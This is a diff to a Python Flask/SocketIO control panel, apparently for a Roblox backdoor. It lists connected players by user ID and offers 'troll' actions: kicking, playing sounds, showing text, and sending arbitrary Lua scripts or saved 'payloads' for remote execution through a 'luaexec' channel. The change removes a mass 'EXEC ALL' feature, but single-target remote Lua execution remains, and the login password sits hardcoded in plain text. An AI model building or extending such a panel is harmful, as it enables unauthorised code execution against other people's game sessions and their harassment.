@@ -17,9 +17,10 @@ app.config["SESSION_COOKIE_SAMESITE"] = "Lax"
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")
 
 # ==================== CONFIG ====================
-LOGIN = "entrepreneur1337"  # Change ici
-PASSWORD = "A9f!Q3r#Zx7L@M2p$T8WkE%yC4H"  # Change ici
+LOGIN = "entrepreneur1337"           # Change ici
+PASSWORD = "A9f!Q3r#Zx7L@M2p$T8WkE%yC4H"        # Change ici
 SESSION_DURATION = 24 * 3600
+
 HISTORY_FILE = "history_log.json"
 PAYLOADS_FILE = "payloads.json"
 
@@ -36,8 +37,7 @@ def load_history():
         try:
             with open(HISTORY_FILE, 'r', encoding='utf-8') as f:
                 history_log = json.load(f)
-        except:
-            history_log = []
+        except: history_log = []
 
 def load_payloads():
     global payloads
@@ -45,15 +45,13 @@ def load_payloads():
         try:
             with open(PAYLOADS_FILE, 'r', encoding='utf-8') as f:
                 payloads = json.load(f)
-        except:
-            payloads = {}
+        except: payloads = {}
 
 def save_payloads():
     try:
         with open(PAYLOADS_FILE, 'w', encoding='utf-8') as f:
             json.dump(payloads, f, ensure_ascii=False, indent=2)
-    except:
-        pass
+    except: pass
 
 load_history()
 load_payloads()
@@ -128,16 +126,14 @@ def logout():
 def add_history(event_type, username, details=""):
     timestamp = datetime.now().strftime("%H:%M:%S")
     history_log.insert(0, {"time": timestamp, "type": event_type, "username": username, "details": details})
-    if len(history_log) > 100:
-        history_log.pop()
+    if len(history_log) > 100: history_log.pop()
     try:
         with open(HISTORY_FILE, 'w', encoding='utf-8') as f:
             json.dump(history_log, f, ensure_ascii=False, indent=2)
-    except:
-        pass
+    except: pass
     socketio.emit("history_update", {"history": history_log[:50]})
 
-# ==================== PANEL HTML (SANS AVATAR, AVEC EXEC MULTI) ====================
+# ==================== PANEL HTML (TOUT CORRIGÉ) ====================
 HTML = """<!DOCTYPE html>
 <html lang="en" class="dark">
 <head>
@@ -168,7 +164,7 @@ HTML = """<!DOCTYPE html>
     .card:hover{transform:translateY(-10px);box-shadow:0 25px 50px rgba(6,182,212,.25);border-color:var(--primary);}
     .card::before{content:'';position:absolute;top:0;left:0;right:0;height:4px;background:linear-gradient(90deg,transparent,var(--primary),transparent);opacity:0;transition:.4s;}
     .card:hover::before{opacity:1;}
-    .status{display:flex;align-items:center;gap:8px;margin-bottom:12px;margin-left:35px;}
+    .status{display:flex;align-items:center;gap:8px;margin-bottom:12px;}
     .dot{width:10px;height:10px;border-radius:50%;background:#ef4444;box-shadow:0 0 10px #ef444430;}
     .dot.online{background:var(--primary);box-shadow:0 0 20px var(--primary);animation:pulse 2s infinite;}
     @keyframes pulse{0%,100%{opacity:1}50%{opacity:.7}}
@@ -234,27 +230,10 @@ HTML = """<!DOCTYPE html>
 <div class="modal" id="kickModal"><div class="modal-content"><h2>Kick</h2><input type="text" id="kickReason" placeholder="Raison (optionnel)"><div class="modal-buttons"><button class="modal-btn cancel">Annuler</button><button class="modal-btn confirm" id="confirmKick">Kick</button></div></div></div>
 <div class="modal" id="playSoundModal"><div class="modal-content"><h2>Sound</h2><input type="text" id="soundAssetId" placeholder="Asset ID"><div class="modal-buttons"><button class="modal-btn cancel">Annuler</button><button class="modal-btn confirm" id="confirmSound">Jouer</button></div></div></div>
 <div class="modal" id="textScreenModal"><div class="modal-content"><h2>Text Screen</h2><input type="text" id="screenText" placeholder="Texte à afficher" value="test"><div class="modal-buttons"><button class="modal-btn cancel">Annuler</button><button class="modal-btn confirm" id="confirmText">Afficher</button></div></div></div>
-
-<!-- MODALE LUA EXEC MULTI -->
-<div class="modal" id="luaExecModal"><div class="modal-content">
-    <h2>Exécuter Lua</h2>
-    <div style="margin-bottom:15px;">
-        <label><input type="checkbox" id="selectAllPlayers"> Tous les joueurs</label>
-    </div>
-    <textarea id="luaScript" placeholder="Code Lua..." style="height:200px;"></textarea>
-    <div style="margin-top:10px;color:var(--text-muted);font-size:0.9rem;">
-        <span id="selectedCount">0</span> joueur(s) sélectionné(s)
-    </div>
-    <div class="modal-buttons">
-        <button class="modal-btn cancel">Annuler</button>
-        <button class="modal-btn confirm" id="confirmLua">Exécuter sur sélection</button>
-        <button class="modal-btn confirm" style="background:#dc2626;" id="confirmLuaAll">EXEC ALL</button>
-    </div>
-</div></div>
-
+<div class="modal" id="luaExecModal"><div class="modal-content"><h2>Exécuter Lua</h2><textarea id="luaScript" placeholder="Code Lua..." style="height:200px;"></textarea><div class="modal-buttons"><button class="modal-btn cancel">Annuler</button><button class="modal-btn confirm" id="confirmLua">Exécuter</button></div></div></div>
 <div class="modal" id="importFileModal"><div class="modal-content"><h2>Importer Fichier</h2><input type="file" id="luaFileInput" accept=".lua,.txt"><div class="modal-buttons"><button class="modal-btn cancel">Annuler</button><button class="modal-btn confirm" id="confirmImport">Exécuter</button></div></div></div>
 
-<!-- Payloads -->
+<!-- Modal Création/Édition Payload -->
 <div class="modal" id="payloadModal"><div class="modal-content">
     <h2 id="payloadModalTitle">Nouveau Payload</h2>
     <input type="text" id="payloadName" placeholder="Nom du payload">
@@ -265,6 +244,7 @@ HTML = """<!DOCTYPE html>
     </div>
 </div></div>
 
+<!-- Modal Import Payload (100% fonctionnel) -->
 <div class="modal" id="executePayloadModal"><div class="modal-content">
     <h2>Importer Payload</h2>
     <input type="text" id="payloadSearch" placeholder="Rechercher payload..." onkeyup="filterPayloads()">
@@ -282,7 +262,6 @@ HTML = """<!DOCTYPE html>
 const socket = io();
 let currentPlayerId = null;
 let editingPayloadName = null;
-let selectedPlayers = new Set();
 
 // Navigation
 document.querySelectorAll('.nav-item').forEach(i => i.addEventListener('click', () => {
@@ -306,61 +285,7 @@ function filterPlayers() {
     });
 }
 
-// === GESTION SÉLECTION MULTIPLE ===
-function updateSelectedCount() {
-    document.getElementById('selectedCount').textContent = selectedPlayers.size;
-}
-
-document.addEventListener('change', (e) => {
-    if (e.target.classList.contains('player-select')) {
-        const id = e.target.dataset.id;
-        if (e.target.checked) selectedPlayers.add(id);
-        else selectedPlayers.delete(id);
-        updateSelectedCount();
-    }
-});
-
-document.getElementById('selectAllPlayers').addEventListener('change', (e) => {
-    document.querySelectorAll('.player-select').forEach(cb => {
-        cb.checked = e.target.checked;
-        const id = cb.dataset.id;
-        if (e.target.checked) selectedPlayers.add(id);
-        else selectedPlayers.delete(id);
-    });
-    updateSelectedCount();
-});
-
-function openLuaExecModal() {
-    selectedPlayers.clear();
-    document.querySelectorAll('.player-select').forEach(cb => cb.checked = false);
-    document.getElementById('selectAllPlayers').checked = false;
-    updateSelectedCount();
-    document.getElementById('luaScript').value = '';
-    document.getElementById('luaExecModal').classList.add('active');
-}
-
-document.getElementById('confirmLua').onclick = () => {
-    const script = document.getElementById('luaScript').value.trim();
-    if (!script) return toast('Script vide');
-    if (selectedPlayers.size === 0) return toast('Aucun joueur sélectionné');
-    selectedPlayers.forEach(id => sendTroll(id, 'luaexec', script));
-    toast(`Script envoyé à ${selectedPlayers.size} joueur(s)`);
-    document.getElementById('luaExecModal').classList.remove('active');
-};
-
-document.getElementById('confirmLuaAll').onclick = () => {
-    const script = document.getElementById('luaScript').value.trim();
-    if (!script) return toast('Script vide');
-    Object.keys(connected_players).forEach(id => {
-        if (connected_players[id]?.online) {
-            sendTroll(id, 'luaexec', script);
-        }
-    });
-    toast('Script envoyé à TOUS les joueurs en ligne !');
-    document.getElementById('luaExecModal').classList.remove('active');
-};
-
-// === FONCTIONS PAYLOADS (inchangées) ===
+// === WORKSHOP PAYLOADS ===
 function loadPayloads() {
     fetch('/payload?action=list').then(r => r.json()).then(data => {
         const list = document.getElementById('payloads-list');
@@ -425,6 +350,7 @@ document.getElementById('savePayload').onclick = () => {
     });
 };
 
+// === IMPORT PAYLOAD (100% fonctionnel) ===
 function openPayloadSelector(id) {
     currentPlayerId = id;
     fetch("/payload?action=list").then(r => r.json()).then(data => {
@@ -469,6 +395,7 @@ document.getElementById('executeTempPayload').onclick = () => {
 function openKickModal(id) { currentPlayerId = id; document.getElementById('kickModal').classList.add('active'); }
 function openPlaySoundModal(id) { currentPlayerId = id; document.getElementById('playSoundModal').classList.add('active'); }
 function openTextScreenModal(id) { currentPlayerId = id; document.getElementById('textScreenModal').classList.add('active'); }
+function openLuaExecModal(id) { currentPlayerId = id; document.getElementById('luaExecModal').classList.add('active'); }
 function openImportFileModal(id) { currentPlayerId = id; document.getElementById('importFileModal').classList.add('active'); }
 
 document.querySelectorAll('.modal .cancel').forEach(b => b.addEventListener('click', () => b.closest('.modal').classList.remove('active')));
@@ -503,6 +430,12 @@ document.getElementById('confirmText').onclick = () => {
     document.getElementById('textScreenModal').classList.remove('active');
 };
 
+document.getElementById('confirmLua').onclick = () => {
+    const script = document.getElementById('luaScript').value.trim();
+    if (script) sendTroll(currentPlayerId, 'luaexec', script);
+    document.getElementById('luaExecModal').classList.remove('active');
+};
+
 document.getElementById('confirmImport').onclick = () => {
     const file = document.getElementById('luaFileInput').files[0];
     if (!file) return toast('Aucun fichier');
@@ -520,9 +453,6 @@ function render(data) {
         let card = document.getElementById(`card_${id}`);
         if (!card) { card = document.createElement('div'); card.className = 'card'; card.id = `card_${id}`; grid.appendChild(card); }
         card.innerHTML = `
-            <div style="position:absolute;top:12px;left:12px;z-index:10;">
-                <input type="checkbox" class="player-select" data-id="${id}" style="width:18px;height:18px;cursor:pointer;">
-            </div>
             <div class="status"><div class="dot ${p.online?'online':''}"></div><span>${p.online?'Online':'Offline'}</span></div>
             <div class="name"><a href="https://www.roblox.com/users/${id}/profile" target="_blank">${p.username}</a> (${id})</div>
             <div class="info">
@@ -555,7 +485,7 @@ function render(data) {
             <div class="category">LUA</div>
             <div class="btn-grid" style="grid-template-columns:1fr 1fr 1fr">
                 <button class="btn" onclick="openImportFileModal('${id}')">FILE</button>
-                <button class="btn" onclick="openLuaExecModal()">EXEC</button>
+                <button class="btn" onclick="openLuaExecModal('${id}')">EXEC</button>
                 <button class="btn" onclick="openPayloadSelector('${id}')">PAYLOAD</button>
             </div>
         `;
@@ -696,3 +626,5 @@ def broadcast_loop():
 if __name__ == "__main__":
     socketio.start_background_task(broadcast_loop)
     socketio.run(app, host="0.0.0.0", port=5000)
+
+
